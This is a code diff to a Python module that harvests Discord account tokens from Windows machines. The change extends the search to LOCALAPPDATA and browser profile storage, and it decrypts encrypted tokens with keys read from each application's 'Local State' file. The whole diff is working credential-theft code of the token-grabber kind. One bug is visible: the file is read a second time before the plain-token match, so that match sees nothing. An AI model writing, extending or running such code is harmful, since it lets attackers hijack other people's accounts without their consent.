@@ -1,4 +1,5 @@
 import base64
+import itertools
 import os
 import pathlib
 import re
@@ -17,38 +18,42 @@ DISCORD_CLIENT_TOKEN_REGEX = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}")
 
 
 def iter_raw_tokens(*, strict_searching=False):
-    base_path = pathlib.Path(os.getenv("APPDATA"))
+    for base_path in (
+        pathlib.Path(os.getenv("APPDATA")),
+        pathlib.Path(os.getenv("LOCALAPPDATA")),
+    ):
+        for path in itertools.chain(
+            base_path.glob("*/Local Storage/leveldb/*.ldb"),
+            base_path.glob("*/User Data/*/Local Storage/leveldb/*.ldb"),
+        ):
+            storage_owner = path.parent.parent.parent
 
-    for path in base_path.glob("*/Local Storage/leveldb/*.ldb"):
+            with open(path, "rb") as storage_file:
+                encrypted_match = RICKROLL_ENCRYPTION_BARRIER_REGEX.search(
+                    storage_file.read()
+                )
 
-        storage_owner = path.parent.parent.parent
+                if encrypted_match is not None:
+                    localstate = storage_owner / "Local State"
+                    if not localstate.exists():
+                        if strict_searching:
+                            raise RuntimeError(
+                                f"Found an encrypted storage file at {path.as_posix()!r} but no localstate file at {localstate.as_posix()!r}"
+                            )
+                        continue
 
-        with open(path, "rb") as storage_file:
-            encrypted_match = RICKROLL_ENCRYPTION_BARRIER_REGEX.search(
-                storage_file.read()
-            )
+                    payload = base64.b64decode(encrypted_match.group(1))
+                    decryption_key = fetch_decryption_key(localstate)
 
-            if encrypted_match is not None:
-                localstate = storage_owner / "Local State"
-                if not localstate.exists():
-                    if strict_searching:
-                        raise RuntimeError(
-                            f"Found an encrypted storage file at {path.as_posix()!r} but no localstate file at {localstate.as_posix()!r}"
-                        )
-                    continue
+                    yield buffer_decrypt(payload, decryption_key)
 
-                payload = base64.b64decode(encrypted_match.group(1))
-                decryption_key = fetch_decryption_key(localstate)
+                else:
+                    match = DISCORD_CLIENT_TOKEN_REGEX.search(storage_file.read())
 
-                yield buffer_decrypt(payload, decryption_key)
+                    if match is None:
+                        continue
 
-            else:
-                match = DISCORD_CLIENT_TOKEN_REGEX.search(storage_file.read())
-
-                if match is None:
-                    continue
-
-                yield match.group(0).decode("utf-8")
+                    yield match.group(0).decode("utf-8")
 
 
 def iter_verified_tokens(session, *, strict_searching=False):
